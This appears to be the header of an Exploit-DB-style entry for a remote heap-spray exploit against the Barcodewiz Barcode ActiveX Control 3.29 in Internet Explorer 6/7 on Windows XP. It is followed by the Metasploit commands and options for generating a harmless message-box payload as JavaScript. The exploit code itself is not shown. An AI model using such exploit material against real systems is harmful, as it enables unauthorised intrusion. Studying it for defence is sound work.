# Exploit Title : Barcodewiz Barcode ActiveX Control 3.29 - Remote HeapSpray (Internet Explorer 6/7)
# Date		: 04/11/2022
# Exploit Author: https://github.com/alan7s
# Version	: 3.29
# Tested on	: Windows XP SP3 (Portuguese)


Metasploit payload windows/messagebox javascript
generate -f js_le
// windows/messagebox - 257 bytes
// https://metasploit.com/
// VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
// TITLE=Ops!, TEXT=Hack3d^.^, ICON=NO